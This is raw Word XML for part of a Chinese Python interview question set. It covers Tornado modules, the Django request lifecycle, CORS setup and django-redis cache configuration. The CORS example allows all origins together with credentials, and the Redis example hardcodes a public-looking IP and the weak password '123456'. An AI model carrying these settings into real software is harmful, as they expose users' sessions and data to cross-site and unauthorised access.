      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>使用的模块？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65303D2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torndb</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torndb是基于mysqldb的再封装，所以使用时要先安装myqldb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A6A536" w14:textId="1DE68FD5"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089</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Tornado</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>操作</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>使用的模块？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421CCA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tornado-redis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6587FDF2" w14:textId="66C5854E" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="002954C8"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090</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架的适用场景？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079AE623" w14:textId="4297E511" w:rsidR="001E7149" w:rsidRPr="002954C8" w:rsidRDefault="001E7149" w:rsidP="002954C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web聊天室，在线投票</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0660B150" w14:textId="2AF73C8F" w:rsidR="00C42547" w:rsidRPr="00956259" w:rsidRDefault="00070451" w:rsidP="00956259">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="53" w:name="_Hlk44101715"/>
      <w:r w:rsidRPr="00956259">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="00956259">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>91</w:t>
      </w:r>
      <w:r w:rsidRPr="00956259">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00C42547" w:rsidRPr="00956259">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>阐述</w:t>
      </w:r>
      <w:r w:rsidR="00C42547" w:rsidRPr="00956259">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00C42547" w:rsidRPr="00956259">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>项目中一个请求的生命周期</w:t>
      </w:r>
      <w:r w:rsidRPr="00956259">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467F0E52" w14:textId="70197CFF"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Pr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00956259" w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00C42547" w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>用户通过浏览器请求一个页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13554BD7" w14:textId="1CDD2DC9"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2</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请求到达Request Middlewares中间件，中间件对request做一些预处理或者直接response请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4B27BC" w14:textId="6C324844"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3</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URLConf通过urls.py文件和请求的URL找到相应的View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40402CB7" w14:textId="600B4725"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4</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View Middlewares被访问，它同样可以对request做一些处理或者直接返回response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79004504" w14:textId="2BB54CC1"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5</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调用View中的函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6490CF" w14:textId="654E5AAF"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6</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View中的方法可以选择性的通过Models访问底层的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F140D79" w14:textId="09F9CBDC"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7</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所有的Model-to-DB的交互都是通过manager完成的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F559E3E" w14:textId="4F0E7A0F"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8</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如果需要，Views可以使用一个特殊的Context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A48EB5" w14:textId="796D61B2" w:rsidR="00C42547" w:rsidRPr="00D348BC" w:rsidRDefault="00325FC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b/>
      </w:r>
      <w:r w:rsidR="00956259" w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="00956259" w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00C42547" w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Context被传给Template用来生成页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E039BF5" w14:textId="36D7644F" w:rsidR="00C42547" w:rsidRPr="00D348BC" w:rsidRDefault="00C42547" w:rsidP="00D348BC">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>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a. Template使用Filters和Tags去渲染输出</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B82D68D" w14:textId="00300225" w:rsidR="00C42547" w:rsidRPr="00D348BC" w:rsidRDefault="00C42547" w:rsidP="00D348BC">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>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b. 输出被返回到View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="456DC32D" w14:textId="4CCEF7F1" w:rsidR="00C42547" w:rsidRPr="00D348BC" w:rsidRDefault="00C42547" w:rsidP="00D348BC">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>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 HTTPResponse被发送到Response Middlewares</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE57B07" w14:textId="3B0AC2BA" w:rsidR="00C42547" w:rsidRPr="00D348BC" w:rsidRDefault="00C42547" w:rsidP="00D348BC">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>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d. 任何Response Middlewares都可以丰富response或者返回一个完全不同的response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F54A449" w14:textId="26DD2A32" w:rsidR="00C42547" w:rsidRPr="00D348BC" w:rsidRDefault="00C42547" w:rsidP="00D348BC">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>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e. Response返回到浏览器，呈现给用户</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="53"/>
    <w:p w14:paraId="1D2F6794" w14:textId="1AB32BA5" w:rsidR="00C42547" w:rsidRPr="00AC014C" w:rsidRDefault="00AC014C" w:rsidP="00AC014C">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>110</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00C42547" w:rsidRPr="00AC014C">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00C42547" w:rsidRPr="00AC014C">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>项目中实现数据接口时如何解决跨域问题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA55156"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答：settings.py文件中配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672E2F66"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添加跨域请求头应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DD501E"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INSTALLED_APPS = [ </w:t>
      </w:r>
      <w:r w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>... 'corsheaders', ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52577699"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添加跨域中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="006DB469"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MIDDLEWARE = [ </w:t>
      </w:r>
      <w:r w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">... 'corsheaders.middleware.CorsMiddleware', </w:t>
      </w:r>
      <w:r w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>... ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAED80B"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跨域允许的请求方式，可以使用默认值，默认的请求方式为:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA2E4CE"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#from corsheaders.defaults import default_methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D308AC3"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#CORS_ALLOW_HEADERS = default_headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A484DC8"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CORS_ALLOW_METHODS = ( 'GET', 'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52DCBDB5"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lastRenderedPageBreak/>
        <w:t>'PUT',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7966B09A"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'PATCH', </w:t>
      </w:r>
      <w:r w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
      <w:r w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 'DELETE', </w:t>
      </w:r>
      <w:r w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
      <w:r w:rsidRPr="00D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 'OPTIONS', )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7391FAB4"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#允许跨域的请求头，可以使用默认值，默认的请求头为:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424BC7D9"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#from corsheaders.defaults import default_headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703E9E6E"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#CORS_ALLOW_HEADERS = default_headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D50D08E"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CORS_ALLOW_HEADERS = ( 'XMLHttpRequest', 'X_FILENAME', 'accept-encoding', 'authorization', 'content-type', 'dnt', 'origin', 'user-agent', 'x-csrftoken', 'x-requested-with', 'Pragma', )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105DB553"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#跨域请求时，是否运行携带cookie，默认为False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7601ED8B"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CORS_ALLOW_CREDENTIALS = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4302D6C5"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#允许所有主机执行跨站点请求，默认为False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF62559" w14:textId="77777777"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#如果没设置该参数，则必须设置白名单，运行部分白名单的主机才能执行跨站点请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2403A2BF" w14:textId="099C739B" w:rsidR="00C42547" w:rsidRPr="00D348BC" w:rsidRDefault="00C42547"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CORS_ORIGIN_ALLOW_ALL = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27654635" w14:textId="2B4F6B38" w:rsidR="00AC014C" w:rsidRPr="001C715A" w:rsidRDefault="00AC014C" w:rsidP="00AC014C">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>113</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="001C715A">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="001C715A">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>项目中如何对接</w:t>
      </w:r>
      <w:r w:rsidRPr="001C715A">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r w:rsidRPr="001C715A">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>高速缓存服务</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F2F2F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73433771"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settings.py文件中配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B2E23C"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CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9DFF20"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'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015134B0"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'BACKEND': 'django_redis.cache.RedisCache',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235EF10C"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'LOCATION': [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C521A2D"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'redis://120.77.222.217:6379/0',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C2F3E5"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06137B96"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'KEY_PREFIX': '生成key的前缀',  # 这里随便写</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3478EE21"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'OPTIONS': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E542A27"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'CLIENT_CLASS': 'django_redis.client.DefaultClient',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE1DC8F"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'CONNECTION_POOL_KWARGS': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD70AE0"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'max_connections': 256,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C924AA"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F90802D"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'PASSWORD': '密码',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0591FFD7"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D108524"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD08C19"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"my_redis": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149B62A4"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"BACKEND": "django_redis.cache.RedisCache",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2823F2F7"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"LOCATION": "redis://127.0.0.1:6379/1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="062CA8DA"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"OPTIONS": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5672BB"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"CLIENT_CLASS": "django_redis.client.DefaultClient",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617C7155"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        'CONNECTION_POOL_KWARGS': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E14BE64"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'max_connections': 256,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD8ED79"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291B3192"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'PASSWORD': '123456',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13497633"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044832EF"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xml:space="preserve"> },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D6BB56"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DDBB25"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使用引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D61394E"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SESSION_ENGINE = 'django.contrib.sessions.backends.cache'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E04E62" w14:textId="77777777"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 设置过期时间86400秒</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520BBD2D" w14:textId="79C42F3B" w:rsidR="00AC014C" w:rsidRPr="00D348BC" w:rsidRDefault="00AC014C" w:rsidP="00D348B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D348BC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SESSION_COOKIE_AGE = 86400</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55958446" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00191162">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="4" w:color="EAECEF"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="500" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>三</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
